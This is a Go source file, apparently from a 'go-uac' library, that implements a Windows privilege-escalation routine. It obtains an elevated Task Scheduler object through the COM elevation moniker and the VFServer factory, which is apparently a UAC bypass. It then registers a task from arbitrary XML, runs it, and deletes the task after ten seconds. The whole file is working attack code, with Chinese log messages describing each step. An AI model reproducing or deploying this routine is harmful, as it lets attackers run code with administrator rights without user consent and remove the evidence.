package method

import (
	"fmt"
	"go-uac/ole"
	"log"
	"syscall"
	"time"
)

func RunTaskService(path, name, xmlText string) error {
	if hr := ole.CoInitializeEx(0, 2); hr.IsFailed() {
		return hr
	}
	defer ole.CoUninitialize()

	bindOpts := &ole.BIND_OPTS3{
		ClassContext: 4,
	}

	efs, hr := ole.CoGetObject[*ole.IElevatedFactoryServer[*ole.ITaskService]](
		fmt.Sprintf("Elevation:Administrator!new:%s", ole.CLSID_VFServer),
		bindOpts,
		ole.IID_ElevatedFactoryServer,
	)

	if hr.IsFailed() {
		return hr
	}
	defer efs.Release()

	taskService, hr := efs.ServerCreateElevatedObject(
		ole.CLSID_TaskScheduler,
		ole.IID_ITaskService,
	)

	if hr.IsFailed() {
		return hr
	}

	if taskService == nil {
		return syscall.Errno(0x0E)
	}
	defer taskService.Release()

	varDummy := ole.VARIANT{}

	if hr = ole.VariantInit(&varDummy); hr.IsFailed() {
		return hr
	}
	defer ole.VariantClear(&varDummy)

	if hr = taskService.Connect(varDummy, varDummy, varDummy, varDummy); hr.IsFailed() {
		return hr
	}

	bstrPath := ole.SysAllocString(path)
	defer ole.SysFreeString(bstrPath)

	taskFolder, hr := taskService.GetFolder(bstrPath)
	if hr.IsFailed() || taskFolder == nil {
		return hr
	}
	defer taskFolder.Release()

	bstrName := ole.SysAllocString(name)
	defer ole.SysFreeString(bstrName)

	bstrXmlText := ole.SysAllocString(xmlText)
	defer ole.SysFreeString(bstrXmlText)

	registeredTask, hr := taskFolder.RegisterTask(bstrName, bstrXmlText, 0, varDummy, varDummy, 3, varDummy)

	// 判断任务是否已经存在
	if hr.IsErr(syscall.ERROR_ALREADY_EXISTS) {
		// 存在则: 停止任务, 删除任务, 创建任务
		log.Println("任务已存在")
		registeredTask, hr = taskFolder.GetTask(bstrName)
		if hr.IsSucceed() {
			log.Println("已找到任务")
			hr = registeredTask.Stop(0)
			log.Println("停止任务:", hr)
			hr = ole.HResult(registeredTask.Release())
			log.Println("释放任务:", hr)
			hr = taskFolder.DeleteTask(bstrName, 0)
			log.Println("删除任务:", hr)
		}

		log.Println("正在创建任务")
		registeredTask, hr = taskFolder.RegisterTask(bstrName, bstrXmlText, 0, varDummy, varDummy, 3, varDummy)
	}

	if hr.IsFailed() || registeredTask == nil {
		log.Println("任务创建失败", hr)
		return hr
	}
	defer registeredTask.Release()

	// 最后 运行任务
	runningTask, hr := registeredTask.Run(varDummy)
	if hr.IsFailed() || runningTask == nil {
		log.Println("任务启动失败", hr)
		return hr
	}
	defer runningTask.Release()

	state, hr := runningTask.GetState()

	if hr.IsSucceed() && state == ole.TASK_STATE_RUNNING {
		log.Println("任务启动成功")
		log.Println("10秒后停止并清理任务")
		time.Sleep(time.Second * 10)
	}

	hr = runningTask.Stop()
	log.Println("[清理]正在停止任务", hr)
	hr = taskFolder.DeleteTask(bstrName, 0)
	log.Println("[清理]正在删除任务", hr)

	return nil
}
